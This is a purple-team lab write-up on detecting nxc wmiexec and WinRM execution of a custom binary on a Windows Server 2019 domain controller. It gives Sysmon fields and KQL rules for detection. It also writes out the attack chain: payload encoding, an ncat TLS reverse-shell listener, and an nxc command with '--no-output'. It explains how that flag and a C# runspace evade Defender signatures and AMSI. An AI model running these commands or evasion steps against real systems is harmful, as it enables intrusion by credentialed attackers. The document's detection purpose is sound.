# nxc wmiexec — Detection Gap Analysis
## Windows Server 2019 DC — Purple Team Lab (Vector 2)

**Date:** 2026-03-25  
**Platform:** Windows Server 2019 (DC01.lab2019.local)  
**Attacker:** Kali Linux — nxc (NetExec) v1.x  
**Defender:** ELK SIEM (Kibana 8.19.12), Sysmon, Winlogbeat, Windows Security Auditing  
**Prerequisite:** [Vector 1 writeup](./scheduled-task-persistence-detection.md) — same lab, same payload, different delivery mechanism.

> This is a detection engineering document. Payload internals and bypass mechanics are intentionally omitted. The focus is on what changes in the telemetry when the delivery vector changes — and what that means for detection coverage.

---

## Context

Vector 1 (goexec/tsch) established a baseline detection picture: two custom KQL rules closed the gaps against scheduled task-based execution. This document asks a different question:

**What happens to that detection coverage when the execution vector changes but the payload and target path stay the same?**

Same binary (`getit1.exe`) in `C:\Windows\Tasks\`. Different delivery. Different telemetry. Different detection outcome.

---

## Threat Model

Same as Vector 1 — privileged insider or attacker with valid domain admin credentials and network access. No exploit required.

The key difference: **no scheduled task is registered**. The attack is a direct remote execution via WMI. Nothing is written to the task scheduler. EID 4698 never fires.

---

## Attack Chain

### 1. Payload Already in Place

A custom C# binary (`getit1.exe`) and an additional encoded payload are already resident in `C:\Windows\Tasks\` from prior access. The C# binary accepts the encoded payload as a command line argument and executes it in memory. No new file drop required for this vector. Payload internals are intentionally omitted.

### 2. Encode Payload on Attacker

The additional payload is encoded for inline delivery as a command line argument to the C# binary:

```bash
ENCODED=$(cat ld.ps1 | iconv -t UTF-16LE | base64 -w 0)
```

### 3. Start C2 Listener

```bash
sudo ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp 8443
```

### 4. Execute via nxc wmiexec

```bash
nxc smb 192.168.1.4 -u administrator -p '<PASSWORD>' --no-output -x "C:\\Windows\\Tasks\\getit1.exe $ENCODED"
```

**Critical flag:** `--no-output` — suppresses nxc's output capture mechanism. Without this flag, nxc attempts to redirect output via `cmd.exe /Q /c [command] 1> C:\windows\temp\[guid].txt` — a pattern Defender has named signatures for (`VirTool:Win32/SuspRemoteCmdCommand.*`). With `--no-output`, the temp file redirection is skipped entirely and Defender does not fire.

### 5. Shell Received

```
Ncat: Connection from 192.168.1.4
SHELL> hostname
DC01
SHELL> dir C:\
    Directory: C:\
...
SHELL> ipconfig
...
```

---

## Evasion Analysis — Two Layers

This vector succeeds because of two independent evasion layers working together. Neither alone is sufficient.

### Layer 1 — `--no-output` bypasses Defender's nxc signature

By default nxc wmiexec executes commands as:

```
cmd.exe /Q /c [command] 1> C:\windows\temp\[guid].txt 2>&1
```

It then reads the temp file to return output. Defender has named signatures for this exact pattern — `VirTool:Win32/SuspRemoteCmdCommand.*` fires on the `cmd.exe /Q /c` + output redirection construct.

`--no-output` removes the redirection entirely:

```
cmd.exe /Q /c [command]
```

No temp file. No signature match. The command executes clean. Output is irrelevant because the shell calls home to the listener independently — `--no-output` costs nothing operationally.

**The key insight:** Defender's nxc signature targets the output capture mechanism — an operational convenience feature — not the execution primitive itself. Remove the convenience, remove the signature.

### Layer 2 — C# runspace executes payload outside standard AMSI scanning path

`--no-output` gets the binary running. But AMSI still scans payload execution. In Vector 1 (goexec/tsch), the ps1 ran directly via `powershell.exe` and AMSI caught it mid-session.

In this vector, `getit1.exe` is a custom C# binary that executes the payload via a programmatically created runspace — outside the standard PowerShell host process where AMSI scanning operates in the conventional way. The payload executes in memory without triggering the same interception that caught the standalone ps1.

**Without the C# binary, `--no-output` alone is insufficient** — AMSI would still catch payload execution. Both layers are required.

### The broader observation

nxc is an openly maintained, widely documented pentesting framework. `--no-output` is a flag in the help text. The evasion here is not clever tradecraft — it is understanding what Defender is actually detecting and removing it.

Defender's signatures for common pentesting tools consistently target **operational scaffolding** — output redirection, temp files, service drops, bat file patterns — rather than core execution primitives. This pattern holds across tools:

| Tool | What's signatured | What's not |
|---|---|---|
| nxc wmiexec | Output redirection temp file | WMI execution itself |
| impacket wmiexec | `\\127.0.0.1\ADMIN$\__[timestamp]` | Command execution |
| psexec | Service binary drop | Remote process creation |
| smbexec | Bat file drop+execute+delete | SMB execution |

Strip the scaffolding, keep the execution. The most dangerous attackers are not necessarily the ones with zero-days. They are the ones who read the help text.

---

## Comparison: Vector 1 vs Vector 2

| Field | Vector 1 (goexec/tsch) | Vector 2 (nxc wmiexec) |
|---|---|---|
| Delivery | MS-TSCH RPC | WMI / SMB |
| Parent process | `svchost.exe` (Task Scheduler) | `cmd.exe` |
| Parent commandline | `powershell.exe -ep bypass -File C:\Windows\Tasks\ld.ps1` | `cmd.exe /Q /c C:\Windows\Tasks\getit1.exe [base64]` |
| CurrentDirectory | `C:\Windows\Tasks\` | `C:\` |
| Privilege | `NT AUTHORITY\SYSTEM` | `LAB2019\Administrator` |
| IntegrityLevel | System | High |
| TerminalSessionId | 0 | 0 |
| EID 4698 fired | Yes | No |
| Scheduled task created | Yes | No |
| Defender fired | Yes (AMSI stream) | No |

---

## SIEM Telemetry

### What fired

**One existing rule fired:** `Sysmon - Binary Execution from Windows Tasks` (original rule, risk score 73)

**But only partially** — see detection gap below.

### What didn't fire

| Rule | Status | Reason |
|---|---|---|
| `Sysmon - PowerShell Execution from Windows Tasks with Bypass` (Rule 1) | **Blind** | No `-ep bypass` in ParentCommandLine, no `-File` argument |
| `Windows Security - Scheduled Task Created in Windows Tasks Directory` (Rule 2) | **Blind** | No scheduled task registered, no EID 4698 |
| `Sysmon - Binary Execution from Windows Tasks` (original rule) | **Partially blind** | Rule hunts `CurrentDirectory: C:\Windows\Tasks\` — wmiexec sets `CurrentDirectory: C:\`, so rule misses this execution |

### The CurrentDirectory gap

The original Tasks rule queries:
```kql
winlog.event_data.CurrentDirectory: "C:\\Windows\\Tasks\\"
```

nxc wmiexec sets `CurrentDirectory: C:\` when spawning the process — not `C:\Windows\Tasks\`. The binary runs from Tasks, but the working directory is the root. The rule fires on working directory, not binary path. **This execution evades the rule entirely.**

### Raw Sysmon EID 1 — key fields

```
Image:             C:\Windows\Tasks\getit1.exe
CurrentDirectory:  C:\                              ← wmiexec sets this, not Tasks
ParentImage:       C:\Windows\System32\cmd.exe      ← not powershell, not svchost
ParentCommandLine: cmd.exe /Q /c C:\Windows\Tasks\getit1.exe [base64]
User:              LAB2019\Administrator
IntegrityLevel:    High                             ← not System
TerminalSessionId: 0
Company:           -                               ← unsigned binary
IMPHASH:           000000000000000000000000000000   ← zeroed, suspicious
```

---

## Detection Gap — Closed

The fix is straightforward: update the existing Tasks rule to hunt on `Image` path rather than `CurrentDirectory`.

**Current rule (blind to this vector):**
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: 1 AND
winlog.event_data.CurrentDirectory: "C:\\Windows\\Tasks\\"
```

**Updated rule (catches both vectors):**
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.Image: *Windows\\Tasks*
```

This fires regardless of what working directory the execution mechanism sets. Binary path is harder to spoof than working directory.

---

## Additional High-Signal IOCs From This Execution

Beyond the path-based detection, this event contains several independent IOCs worth noting:

| IOC | Field | Value | Significance |
|---|---|---|---|
| Unsigned binary | `Company` | `-` | No publisher — not a legitimate Windows binary |
| Zeroed IMPHASH | `IMPHASH` | `000000...` | Indicates deliberate PE manipulation |
| Large base64 blob in CommandLine | `CommandLine` | `getit1.exe [base64]` | Encoded payload passed inline — suspicious regardless of path |
| cmd.exe /Q /c pattern | `ParentCommandLine` | `cmd.exe /Q /c [binary] [args]` | Classic remote execution wrapper |
| Non-interactive session | `TerminalSessionId` | `0` | Remote execution context |

A rule hunting on any one of these independently would catch this execution without relying on path matching at all.

---

## Defender Signature Catalogue — nxc Execution Methods

From live Defender event log analysis during failed nxc attempts:

| nxc Method | Defender Signature | Fired On |
|---|---|---|
| wmiexec (default) | `VirTool:Win32/SuspRemoteCmdCommand.F/.H/.I/.N` | cmd.exe /Q /c output redirection pattern |
| wmiexec `--no-output` | No detection | Output redirection removed |
| smbexec | `VirTool:Win32/SuspRemoteCmdCommand.*` | bat file drop+execute+delete pattern |
| impacket wmiexec | `VirTool:Win32/Impacket.D` | `\\127.0.0.1\ADMIN$\__[timestamp]` output pattern |

**Key finding:** Defender's nxc/impacket signatures target the **output capture mechanism**, not the command being executed. Removing output capture (`--no-output`) bypasses the signature entirely.

---

## Detection Summary

### nxc wmiexec `--no-output`

| Stage | Data Source | Event | Rule | Status |
|---|---|---|---|---|
| SMB file drop / C$ access | Security EID 5145 | `\\*\C$` access from attacker IP | Admin Share Access — C$ via SMB | **Caught — 2 minutes before execution** |
| Remote execution | Security / WMI | WMI execution | No rule written | Gap |
| Process creation | Sysmon EID 1 | getit1.exe from Tasks, `CurrentDirectory: C:\` | Original Tasks rule | **Blind** (CurrentDirectory mismatch) |
| Process creation | Sysmon EID 1 | getit1.exe `Image` path | Updated Image-based rule | **Closed** |
| Scheduled task | Security EID 4698 | — | Rule 2 | **Blind** (no task created) |
| Execution policy bypass | Sysmon EID 1 | — | Rule 1 | **Blind** (no `-ep bypass`) |
| Defender | Windows Defender Operational | — | — | **No detection** (`--no-output` bypasses signatures) |

### nxc winrm `--no-output`

| Stage | Data Source | Event | Rule | Status |
|---|---|---|---|---|
| SMB file drop / C$ access | Security EID 5145 | — | Admin Share Access — C$ via SMB | **Blind** — WinRM does not use SMB share for execution |
| Process creation | Sysmon EID 1 | getit1.exe, `CurrentDirectory: C:\Users\Administrator\` | Original Tasks rule | **Blind** (CurrentDirectory mismatch) |
| Process creation | Sysmon EID 1 | getit1.exe `Image` path | Updated Image-based rule | **Closed** |
| Network connection | Sysmon EID 3 | getit1.exe → `192.168.1.218:8443`, no hostname resolution, `RuleName: Tasks` | No alert rule written | **Data present, no alert** |
| Scheduled task | Security EID 4698 | — | Rule 2 | **Blind** |
| Execution policy bypass | Sysmon EID 1 | — | Rule 1 | **Blind** |
| Defender | Windows Defender Operational | — | — | **No detection** |

**WinRM is the most evasive vector tested.** No SMB share access, no scheduled task, no execution policy bypass string, no Defender detection. The only existing rule that catches it is the Image-based Tasks rule. Without that rule deployed, the execution leaves no alert — only raw telemetry.

### Raw Telemetry Available for WinRM (no alert fired)

**Sysmon EID 1:**
```
Image:             C:\Windows\Tasks\getit1.exe
CurrentDirectory:  C:\Users\Administrator\       ← WinRM user home context
ParentImage:       C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\Tasks\getit1.exe [base64]
Company:           -
IMPHASH:           000000000000000000000000000000
TerminalSessionId: 0
IntegrityLevel:    High
```

**Sysmon EID 3 (Network Connect):**
```
Image:               C:\Windows\Tasks\getit1.exe
DestinationIp:       192.168.1.218
DestinationPort:     8443
DestinationHostname: -                           ← direct IP, no DNS resolution
RuleName:            Tasks                       ← Sysmon config already tagged this
Protocol:            tcp
Initiated:           true
```

The EID 3 `RuleName: Tasks` tag is significant — the Sysmon NetworkConnect config was already monitoring outbound connections from the Tasks path and labelling them. No alert rule exists to fire on it. A rule hunting on `event.code: "3" AND winlog.event_data.RuleName: "Tasks"` would catch the C2 callback regardless of delivery method.

### The Network Layer Catches What Execution Layer Misses (wmiexec only)

For the wmiexec vector, the **Admin Share C$ rule** (EID 5145) fired 2 minutes before getit1 executed — catching the SMB file drop at the network/auth layer before any execution-layer rule had a chance to fire.

For the WinRM vector, no network-layer rule fires — WinRM authentication does not generate EID 5145. The only network-layer telemetry is Sysmon EID 3, which is present but has no alert rule.

**The core detection-in-depth lesson:** changing execution method evades execution-layer signatures. Changing delivery protocol evades network-layer detection. The combination of both — WinRM for delivery and execution — bypasses every alert rule currently deployed except the Image-based Tasks rule.

---

## Remaining Gaps

1. **WMI execution event** — no rule on WMI-initiated process creation. Sysmon EID 1 filtered on `ParentImage: WmiPrvSE.exe` would catch WMI-spawned processes generically.
2. **Large base64 blob in CommandLine** — no rule hunting on unusually long or base64-pattern command line arguments. High-signal IOC left undetected.
3. **Unsigned binary execution** — no rule on `Company: -` or zeroed IMPHASH. Both are independently suspicious.
4. **Sysmon EID 3 — outbound connection from Tasks** — telemetry present and tagged `RuleName: Tasks` by Sysmon config. No alert rule written. KQL to close:
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "3" AND
winlog.event_data.RuleName: "Tasks"
```
This catches the C2 callback regardless of delivery method — wmiexec, WinRM, or any other vector — as long as the binary lives in Tasks.
5. **Credential problem** — upstream of all detection layering.

---

## Evasion Considerations

The updated Image-based rule is more durable than the original CurrentDirectory rule, but still path-dependent. Variations that would evade:

| Variation | Updated Rule Impact |
|---|---|
| Binary moved outside `C:\Windows\Tasks\` | Blind |
| Binary renamed | Blind if name-based filtering added |
| Fileless execution — payload never touches Tasks | Blind |
| LOLBin execution instead of custom binary | Blind |

Detection based on binary path is a starting point. Behaviour-based detection (WMI parent, unsigned binary, base64 commandline) is more robust and independent of attacker path choices.

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Windows Management Instrumentation | T1047 |
| Scheduled Task/Job: Scheduled Task | T1053.005 |
| Hide Artifacts: Hidden Files and Directories | T1564.001 |
| Execution: PowerShell (via C# runspace) | T1059.001 |
| Lateral Movement: Remote Services | T1021 |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nxc (NetExec) | Remote WMI execution |
| ncat (TLS) | Encrypted reverse shell listener |
| Sysmon | Process creation telemetry |
| Winlogbeat 8.19.12 | Log shipping to ELK |
| Kibana 8.19.12 | SIEM alerting and rule analysis |

---

*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
